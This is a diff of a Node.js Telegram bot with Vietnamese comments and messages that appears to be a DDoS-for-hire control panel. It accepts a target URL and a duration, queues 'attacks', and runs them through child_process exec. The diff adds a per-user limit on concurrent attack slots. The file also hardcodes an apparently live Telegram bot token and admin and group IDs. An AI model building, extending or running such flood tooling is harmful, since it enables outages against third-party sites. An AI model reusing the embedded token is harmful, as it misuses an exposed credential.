@@ -4,8 +4,9 @@ const { exec } = require('child_process');
 const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
 const adminId = 1243471275;
 const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
-const maxConcurrentAttacks = 3; // Giới hạn số tiến trình đồng thời toàn hệ thống
-const maxTimeAttacks = 120;
+const maxConcurrentAttacks = 3; // Giới hạn số lệnh đồng thời toàn hệ thống
+const maxSlot = 1; // Mỗi tài khoản chỉ có thể chạy 1 lệnh đồng thời
+const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi lệnh
 
 const bot = new TelegramBot(token, { polling: true });
 const currentAttacks = new Map(), attackQueue = [];
@@ -57,9 +58,10 @@ bot.on('message', async (msg) => {
         if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });
         if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
 
-        // Kiểm tra xem người dùng hiện tại đã có lệnh đang chạy chưa
-        if (currentAttacks.has(chatId)) {
-            return bot.sendMessage(chatId, '🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.', { parse_mode: 'HTML' });
+        // Kiểm tra số lệnh đang chạy của người dùng hiện tại
+        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
+        if (userAttacks >= maxSlot) {
+            return bot.sendMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.`, { parse_mode: 'HTML' });
         }
 
         // Kiểm tra số lệnh đang chạy toàn hệ thống
